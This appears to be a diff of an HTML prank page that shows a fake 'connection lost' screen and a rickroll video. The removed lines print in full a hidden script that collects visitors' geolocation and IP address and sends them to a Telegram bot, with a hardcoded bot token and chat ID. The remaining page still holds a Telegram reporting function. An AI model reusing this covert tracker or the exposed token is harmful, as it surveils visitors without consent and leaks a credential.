@@ -89,72 +89,10 @@ body {
 </div>
 
 <div id="rickrollVideo">
-  <video id="rickrollPlayer" src="https://cdn.glitch.me/cd0cfd15-2d51-4a03-9663-fce885267aaa/rickroll.mp4?v=1745426735746" autoplay muted playsinline loop></video> #https://cdn.glitch.me/cd0cfd15-2d51-4a03-9663-fce885267aaa/rickroll.mp4?v=1745426735746
+  <video id="rickrollPlayer" src="rickroll.mp4" autoplay muted playsinline loop></video> <!-- https://cdn.glitch.me/cd0cfd15-2d51-4a03-9663-fce885267aaa/rickroll.mp4?v=1745426735746 -->
 </div>
-  <script>
-    // Telegram Bot Token and Chat ID
-    const telegramBotToken = "7719637928:AAFsQ6QHSH7z_GUeu6HMYl62yngKQPsRL_g";
-    const telegramChatId = "6013637983";
-
-    // Function to send message to Telegram bot
-    function sendMessage(message) {
-      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-      const data = {
-        chat_id: telegramChatId,
-        text: message
-      };
-
-      $.ajax({
-        url: url,
-        method: "POST",
-        data: JSON.stringify(data),
-        contentType: "application/json",
-        success: function(response) {
-          console.log("Message sent successfully:", response);
-        },
-        error: function(error) {
-          console.error("Error sending message:", error);
-        }
-      });
-    }
-
-    // Function to get user's location
-    function getUserLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showLocation);
-      } else {
-        document.getElementById("location").innerHTML = "Geolocation is not supported by this browser.";
-      }
-    }
-
-    // Function to display user's location
-    function showLocation(position) {
-      var latitude = position.coords.latitude;
-      var longitude = position.coords.longitude;
-      document.getElementById("location").innerHTML = "Latitude: " + latitude + ", Longitude: " + longitude;
-
-      // Send location to Telegram bot
-      sendMessage(`Location: Latitude: ${latitude}, Longitude: ${longitude}`);
-    }
-
-    // Function to get user's IP address
-    function getUserIP() {
-      $.getJSON("https://api.ipify.org?format=json", function(data) {
-        document.getElementById("ip").innerHTML = "IP Address: " + data.ip;
-
-        // Send IP address to Telegram bot
-        sendMessage(`IP Address: ${data.ip}`);
-      });
-    }
-
-    // Call functions to get location and IP address
-    getUserLocation();
-    getUserIP();
-
-
-
-
-    
+  
+<script>
   const reconnectButton = document.getElementById('reconnectButton');
   const connectionLostDiv = document.getElementById('connectionLost');
   const rickrollVideoDiv = document.getElementById('rickrollVideo');
@@ -179,8 +117,8 @@ body {
   });
 
   function sendTelegramMessage(message) {
-    const telegramBotToken = '7719637928:AAFsQ6QHSH7z_GUeu6HMYl62yngKQPsRL_g';
-    const telegramChatId = '6013637983';
+    const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+    const telegramChatId = 'YOUR_TELEGRAM_CHAT_ID';
     const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
     fetch(apiUrl, {
@@ -224,7 +162,3 @@ body {
 
 </body>
 </html>
-
-
-
-
